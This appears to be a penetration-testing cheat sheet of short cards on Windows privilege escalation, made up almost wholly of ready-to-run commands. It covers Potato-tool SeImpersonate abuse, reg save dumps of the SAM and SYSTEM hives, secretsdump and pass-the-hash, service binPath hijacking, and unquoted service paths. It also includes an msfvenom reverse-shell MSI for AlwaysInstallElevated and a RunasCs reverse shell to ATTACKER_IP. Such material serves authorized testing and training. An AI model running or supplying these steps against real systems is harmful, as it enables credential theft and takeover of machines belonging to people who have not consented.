title: whoami /priv — which token privileges matter
inline_answer:
```
whoami /priv
whoami /groups
```

Actionable if **Enabled** (or present — most can be re-enabled): **SeImpersonate / SeAssignPrimaryToken** → Potato → SYSTEM. **SeBackup / SeRestore** → dump SAM/SYSTEM. **SeDebug** → LSASS / inject SYSTEM. **SeTakeOwnership** → own a SYSTEM file. **SeLoadDriver** → vulnerable driver. **SeManageVolume** → arbitrary write. Backup Operators / Server Operators groups = same as SeBackup / service control.

title: Which Potato? (SeImpersonate → SYSTEM)
inline_answer:
Order to try:

1. **SigmaPotato** — broadest, modern .NET, try first.
2. **PrintSpoofer** — Win10 / Server 2016–2019, clean and reliable.
3. **GodPotato** — very broad version support, good fallback.
4. **JuicyPotato** — only Win7/8/Server 2008–2012 (CLSID-based; dead on modern).

If `whoami /priv` lacks SeImpersonate on a service account → **FullPowers** to restore it first.

title: SeBackupPrivilege → dump SAM/SYSTEM
inline_answer:
```
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# if reg save is blocked: diskshadow script + robocopy /b
```

Exfil both, then on Kali: `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`. PtH the local Administrator NT hash.

title: Service hijack — weak perms / writable binary
inline_answer:
```
# permissions on the service object
accesschk.exe -uwcqv user *        (or PowerUp Get-ModifiableService)
sc qc <svc>                        # check BINARY_PATH_NAME + start type
# SERVICE_CHANGE_CONFIG / ALL_ACCESS:
sc config <svc> binPath= "C:\Windows\Temp\rev.exe" && sc stop <svc> && sc start <svc>
# or just replace a writable service binary, then restart / reboot
```

title: Unquoted service path
inline_answer:
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
```

Path like `C:\Program Files\Some App\svc.exe` with a writable earlier directory → drop payload as `C:\Program.exe` or `C:\Program Files\Some.exe` (the gap before the first space). Restart the service.

title: AlwaysInstallElevated
inline_answer:
**Both** keys must be `0x1`:

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o e.msi
msiexec /quiet /qn /i C:\Windows\Temp\e.msi
```

title: RunasCs — run as another user
inline_answer:
Have a username+password but no shell as them (no RDP/WinRM)?

```
RunasCs.exe USER PASS cmd.exe -r ATTACKER_IP:PORT
RunasCs.exe USER PASS "powershell -e <b64>" --bypass-uac -l 5
```

`-l 5` (service) or `-l 2` (interactive) logon type if the default fails. Catch with Penelope.

title: Cross-compile for Windows on Kali
inline_answer:
```
# EXE (64-bit)
x86_64-w64-mingw32-gcc x.c -o x.exe
# DLL (64-bit)
x86_64-w64-mingw32-gcc x.c -shared -o x.dll
# 32-bit
i686-w64-mingw32-gcc x.c -o x.exe
```

Missing? `apt install gcc-mingw-w64`. For C# use `mcs` / build on a Windows VM.
